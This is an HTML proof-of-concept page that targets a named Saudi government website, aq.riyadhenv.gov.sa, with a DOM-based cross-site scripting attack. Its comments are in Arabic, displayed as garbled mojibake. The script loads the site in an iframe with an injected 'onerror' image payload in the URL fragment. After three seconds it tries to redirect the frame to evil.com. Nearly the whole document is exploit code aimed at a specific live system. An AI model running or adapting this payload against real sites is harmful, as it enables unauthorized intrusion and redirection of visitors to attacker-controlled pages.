<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>PoC â€“ DOM XSS + Redirect â€“ aq.riyadhenv.gov.sa</title>
</head>
<body>
  <h3>ğŸš¨ DOM XSS + Redirect PoC â€“ aq.riyadhenv.gov.sa</h3>
  <p>Ø¥Ø°Ø§ Ø¸Ù‡Ø±Øª Ø±Ø³Ø§Ù„Ø© Ø§Ù„ØªÙ†Ø¨ÙŠÙ‡ØŒ ÙØ§Ù„Ù…ÙˆÙ‚Ø¹ Ù…ØµØ§Ø¨. Ø³ÙŠØªÙ… Ø§Ù„ØªÙˆØ¬ÙŠÙ‡ Ø¨Ø¹Ø¯ 3 Ø«ÙˆØ§Ù†Ù Ø¥Ù„Ù‰ Ù…ÙˆÙ‚Ø¹ Ø®Ø§Ø±Ø¬ÙŠ.</p>

  <iframe id="exploitFrame" style="width:100%; height:300px; border:1px solid #ccc;"></iframe>

  <script>
    const target = "https://aq.riyadhenv.gov.sa/#q=<img src=x onerror=alert('XSS')>";
    const iframe = document.getElementById("exploitFrame");

    // ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø±Ø§Ø¨Ø· ÙÙŠ iframe
    iframe.src = target;

    // Ø¨Ø¹Ø¯ 3 Ø«ÙˆØ§Ù†ÙØŒ Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ù„ØªÙˆØ¬ÙŠÙ‡ Ø¥Ù„Ù‰ Ù…ÙˆÙ‚Ø¹ Ø®Ø§Ø±Ø¬ÙŠ
    setTimeout(() => {
      try {
        iframe.contentWindow.location = "https://evil.com";
      } catch (e) {
        console.warn("Redirection blocked by browser CSP.");
      }
    }, 3000);
  </script>
</body>
</html>
